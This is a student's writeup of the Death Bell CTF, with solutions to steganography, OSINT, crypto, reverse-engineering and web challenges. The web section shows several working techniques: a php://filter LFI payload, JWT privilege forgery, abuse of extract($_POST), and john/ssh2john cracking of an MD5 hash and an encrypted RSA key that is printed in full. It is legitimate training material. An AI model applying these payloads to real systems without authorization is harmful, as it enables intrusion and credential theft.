# DeathBellCTFWriteup
Death Bell CTF Writeup by Siddhant Chouhan
CSE-CSF


From the Rules Page: Inspect the page, s3ntinel{let_the_game_begin}         

stegno: oohh: strings and grep
	 <rdf:li>s3ntinel{m3t@_d@t@_@g@1n}</rdf:li>
	

stegno: error:
We are given a transparent background image of cyber sentinel logo i used foto forensics website and found that there was some text on the 
left side but i couldnt read it so i used the hidden pixels feature on their website and got the flag.
  s3ntinel{Y0u_@r3_M@gn!fi3r}

Misc: Am i invisible
use  zsteg -a h1 anatony.png

we can partially see the flag lets extract that header.
zsteg  anatony.png -E b1,bgr,lsb,xy  > output8.txt
strings and grep the flag. s3ntinel{B3ing_invisib1e_i5_lit_4f_18723}

stegno: Preety Sweet,
we are given a jpg image but when we open it, it says there is some error in image this means that the  image headers are wrong so lets manually correct them
open hexeditor and correct the headers, later a hint was given What's a hotel room called? answer to that will be suite so found out that there's a tool called
stegosuite used it, put the password suite and got the flag.  s3ntinel{st3g0_1s_aws0m3_19570}
		
OSINT:
gitcom
In this challenge we have to stalk vibhu sir xD opened github profile for the username Vibhu025

saw 2 repositories but cant see the flag,
used sherlock to find out occurences of Vibhu025 on the internet, checked all hack the box, hackerone, bugcrowd,linkedin...etc. didnt find anything.
Went back to github and saw the commit messages for the repos,
found the flag in the code repo commit messages:
	s3ntinel{g1t_c0mm1t_m3ss@g3s}

Mountains

we are given a picture of a mountain. viewed the exif data for the picture and found the coordinates: 35.3606247,138.7186086
so google my good friend find this place for me, google gave mount fuji, the flag format is given int he question so:
	s3ntinel{mount_fuji}

	Crypto
CHAI NA
the given text is base64 encoded decode it, we get some chinese language so use google translate: China has Chinese, 
so s3ntinel{China_has_Chinese}


QBQB: We are given a qr code but it looks inverted so inverted it and used google lens to scan the qr code, got 

zooozzoo zzoozzoo zoozoooz zooozozz zoozozzo zoozoooz zoozzozo zoozoozz zoooozoo zoozzzoz zzoozzzo zoozoooz zzoozozz zooozzoz zoooozzo zozooooo zoozzzoo 
zzoozzzz zoozzozz zzoozzoo zozooooo zoozozzo zooozzoo zozooooo zoozzooz zooozozo zoozoooz zooooozo

replaced z with 1 and o with 0 got binary data tried to convert it to text but failed so replaced z with 0 and o with 1 and converted the bianry data and
got the flag.

s3ntinel{b1n4ry_c0d3_is_fun}


Bonjour

the french text on google translate gives : all you need is a dozen and some knowledge of French.
 
so the text which we want to ge the flag from is : r4egiesc{x4l,zùf^p2ny4fç2rçrp5fl}
this is written in french keyboard called AZERTY and we want in flag in english which means QWERTY keyboard.
so simply keyboard shift cipher 

    e3zfuzqx{w3knamdpo1bt3d_1e_eo4dk}


Now lets try Rot12
it didnt work, then rot 13 didnt work, rot14 it worked!    
    s3ntinel{k3yboardc1ph3r_1s_sc4ry}


Saber:  First did rot13 of VG'F NYJNLF ORGGRE GB XRRC GUVATF GUR JNL GURL NER it said leave things like they are, there is also another string in the question

IRFELVALECUIN

at first i couldn't think of any cipher then i googled "Sabre meaning" on google, i found that it means : a light fencing sword with a tapering,
typically curved blade.

so fencing is the keyword here so searched on decodefr website and found Rail Fence (Zig-Zag) Cipher
so i used the automatic decryption feature and there were many results, ILUVRAILFENCE this was the flag. s3ntinel{ILUVRAILFENCE}


	Reverse Engineering
Secret: Read the challenge description Go pack your bags take a UPs and an Xbox home this means  UPX so googel it, then we unpack the file using upx -d comsecret

then use radare2  The aa command analyzes all flags starting with sym. (symbols/function names) and entry0 (i.e. _start, the program’s entry point).

the use VV to enter into graph mode analyse the graph we find thhe secret key is S3cr3t_k3y. Do ./comsecret S3cr3t_k3y and there is our flag!  

s3ntinel{S3cr3t_k3y}

Login:
Opened the file in a text editor, then observed username is 0n3_W4rM and the password is zLl1ks_d4m_T0g_I 
But it said password is wrong.And in the question its given that Nothing is the right way around. so reversed the password.
'I_g0T_m4d_sk1lLz'

root@Kali-Linux:~# ./Downloads/login 0n3_W4rM I_g0T_m4d_sk1lLz
/===========================================================================\
|                              Unlock Me!!!                                 |
+===========================================================================+
 ~> Verifying.......Correct!
Welcome back!
s3ntinel{I_g0T_m4d_sk1lLz}
root@Kali-Linux:~# 
 
Shift's Over: i wasn't able to complete the challenge but i managed to solve one part of it.

First we use rabin2

root@Kali-Linux:~/Downloads# rabin2 -zqq Shift_over
%Y%m%d%H%M
%lld
s3ntinel{
The whole 2020 is just one big apocalypse but this doesn't stops my company from making their selfish profits!
Well today is day 170 of the apocalypse here i am a developer just working my shift away!
My shift normally starts at 5 PM but goes on till 10 PM but today my boss wants to have a meeting with me. Don't know why! but have to stop by after my shift.
\nWell finally the code is complete!!! It took only ten more minutes but at last! Shift's over! Its all about the time now ;)
Well The meeting ended. It tok one and a half hour extra and my boss wanted some changes in my code.
root@Kali-Linux:~/Downloads# 

so the program is supposedly taking values in the format %Y%m%d%H%M
%lld but when we run it doesn't ask for these parameters, some thing is fishy. Opened the code in IDA tried to understand it got to know that the program is
taking the values year month date and time from our system so we calculated from the strings we got in rabin2 output so after doing some math the exact figure was 

202006182340

sudo timedatectl set-time '2020-06-22 01:18:00'
so set your device date and time to this and execute the file again
root@Kali-Linux:~/Downloads# sudo timedatectl set-time '2020-06-18 23:40:00'
root@Kali-Linux:~/Downloads# ./Shift_over 
s3ntinel{118 105 111 101 95 111 97 104 97 108 113 112 }
Well finally the code is complete!!! It took only ten more minutes but at last! Shift's over! Its all about the time now ;)
So now some shift cipher probably but i wasn't able to crack it :P.



Devil's Shop
simple jwt challenge , use burpsuite get the token,  go to jwt.io edit priveledge to Admin as stated in the comments first letter is capital letter
then copy the new token and modify in burp and get the flag.  s3entinel{jwt_are_imp0rt4nt} 


	Series

inspect the page.
			            <!--<tr> I promise to remove this in next update
                                    <td class="column1">Now start crawling like a robot</td>
                                    </tr>-->
Go to http://series.cybersentinel.in/robots.txt always check robots.txt 


Congrats You are not a robot Flag 1: s3ntinel{r0b0ts_w1ll_t@k3_0v3r_us}

Now Go To :/app/l0g1n.php

challenge 2 we are given a hash so let john crack it

Session completed
root@Kali-Linux:~# john --format=raw-md5 ha --show
?:zvzvb

1 password hash cracked, 0 left
root@Kali-Linux:~# 

lets go to that page and put the creds

Congrats on login Here's Your Flag 2: s3ntinel{zvzvb}

You are in /index.php/?file=

The book is located at book.php

lets go to http://series.cybersentinel.in/app/index.php?file=book.php

reminds me of NahamConCTF xD  So lets try to access the files like ?file=/etc/passwd
but we cant so lets do php filter evasion 

 ?file=php://filter/convert.base64-encode/resource=book.php

got a base 64 string:
PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCmlmKCFpc3NldCgkX1NFU1NJT05bInVpZCJdKSB8fCAkX1NFU1NJT05bInVpZCJdICE9PSAiYzlmZGVkMTE2NGI1NmE1ZjE0YWVkZTQ1MDYwMjE0ODAiKXsNCiAgICBoZWFkZXIoImxvY2F0aW9uOiBsMGcxbi5waHAiKTsNCiAgICBleGl0Ow0KICB9DQo/Pg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQogICAgPGhlYWQ+DQogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICAgICAgPHRpdGxlPlBocGhvbmVib29rPC90aXRsZT4NCiAgICAgICAgPHN0eWxlPg0KICAgICAgICAgICAgLyogQ1NTIHBhZ2UqLw0KICAgICAgICAgICAgYm9keSwgaHRtbHsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIGhlaWdodDogMTAwJTsNCiAgICAgICAgICAgIG1hcmdpbjowcHg7DQogICAgICAgICAgICBwYWRkaW5nOjBweDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC5iZ3sNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IGdyZXk7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI2hlYWRlcnsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIGNvbG9yOiBibGFjazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNpbV9jb250YWluZXJ7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAuZGVzY3sNCiAgICAgICAgICAgIGNvbG9yOmJsYWNrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9ybXsNCiAgICAgICAgICAgIG1heC13aWR0aDogNjAwcHg7DQogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOw0KICAgICAgICAgICAgY29sb3I6IGJsYWNrOw0KICAgICAgICAgICAgdGV4dC1hbGlnbjpjZW50ZXI7DQogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNmb3JtX2xhYmVsew0KICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI2NvbnRhaW5lcnsNCiAgICAgICAgICAgIGNvbG9yOiBibGFjazsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC5saW5rc3sNCiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgPC9zdHlsZT4NCiAgICA8L2hlYWQ+DQogICAgPGJvZHkgY2xhc3M9ImJnIj4NCiAgICAgICAgPGgxIGlkPSJoZWFkZXIiPiBXZWxjb21lIHRvIHRoZSBCb29rIFN0b3JlIDwvaDE+DQogICAgICAgIDxkaXYgaWQ9ImltX2NvbnRhaW5lciI+DQogICAgICAgICAgICA8aW1nIHNyYz0iYm9vay5qcGciIHdpZHRoPSI1MCUiIGhlaWdodD0iMzAlIi8+DQogICAgICAgICAgICA8cCBjbGFzcz0iZGVzYyI+DQogICAgICAgICAgICAgICAgR2V0IG1lIG15IGJvb2sgb3IgZ28gaG9tZS4uDQogICAgICAgICAgICA8L3A+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8YnI+DQogICAgICAgIDxicj4NCiAgICAgICAgPGRpdj4NCiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIjIj4NCiAgICAgICAgICAgICAgICA8bGFiZWwgaWQ9ImZvcm1fbGFiZWwiPkVudGVyIEJvb2sgTmFtZTogPC9sYWJlbD4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibnVtYmVyIj4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0Ij4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxkaXYgaWQ9ImNvbnRhaW5lciI+DQogICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgIGV4dHJhY3QoJF9QT1NUKTsNCiAgICAgICAgICAgICAgICAvLyBGbGFnIDM6IHMzbnRpbmVse3kwdV9rbjB3X2xmMV9teV9mcjEzbmR9DQogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRvd25lcikpew0KICAgICAgICAgICAgICAgIGVjaG8oZmlsZV9nZXRfY29udGVudHMoImZsYWcudH
h0IikpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgID8+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvYm9keT4NCjwvaHRtbD4NCg==

lets decode it hello cyberchef my good friend.


<div>
            <form method="POST" action="#">
                <label id="form_label">Enter Book Name: </label>
                <input type="text" name="number">
                <input type="submit" value="Submit">
            </form>
        </div>
        <div id="container">
            <?php
                extract($_POST);
                // Flag 3: s3ntinel{y0u_kn0w_lf1_my_fr13nd}
                if (isset($owner)){
                echo(file_get_contents("flag.txt"));
                }
            ?>
        </div>
    </body>
</html>


ok so now the isset($owner) suggests we have to make a POST request and we should have owner as a param so lets burp !



       <br>
        <div>
            <form method="POST" action="#">
                <label id="form_label">Enter Book Name: </label>
                <input type="text" name="number">
                <input type="submit" value="Submit">
            </form>
        </div>
        <div id="container">
            Flag 4: s3ntinel{b00k_3xtr4ct3d}

My Friend Said something interesting is going on over at d1rb_s@f3.php        </div>
    </body>
</html>

lets change book.php to d1rb_s@f3.php in the repeater module.


HTTP/1.1 200 OK
Connection: close
X-Powered-By: PHP/7.2.29
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Content-Length: 110
Vary: Accept-Encoding
Date: Sun, 21 Jun 2020 07:44:43 GMT
Server: LiteSpeed

Congrats on Flag 5: s3ntinel{y0u_kn0w_http_m3th0ds_t00}

Go at /crypt/index.php instead /app/d1rb_s@f3.php

Ok so we have flag 5 as well 

made the changes and found flag 6


My Friend said he is Sorry and gave me this for Flag 6: 


Ｔurｎｓ Ｏut hｅ waｓ uｓⅰng Ｓoｍｅ Ｓｅtgnｏ Wｈіch maｄｅ ｈіm ｗｅak ａnｄ ｈe sａⅰｄ ｈe іs ｓοｒｒy fоr not usⅰｎｇ an ϲοｒrｅct tｅｃｈnіqｕｅ toi hide the meesage

Next Challenge (Flag 7) crypto.php

this is homoglyphis cipher found the flag 6 : i_am_so_sorry_steg_sucks

Ok so we go to our browser and open the file:
we get RSA private key there lets copy it.



-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----


save it in a file called private.key

now again read the challenge description.
we want to crack a password from a key. 
So we can use ssh2john and then brute force to get the password.
so python /usr/share/john/ssh2john.py private.key > answer

cat answer
private.key:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63

ok looks good lets crack it.

john answer --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (private.key)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:51 DONE (2020-06-21 16:55) 0.01951g/s 279892p/s 279892c/s 279892C/sa6_123..*7¡Vamos!
Session completed
and the cracked password is the flag 7. s3ntinel{computer2008}


Feedback form:
s3ntinel{f33db@ck_!s_th3_br3@kf@st_0f_ch@mp!0ns}
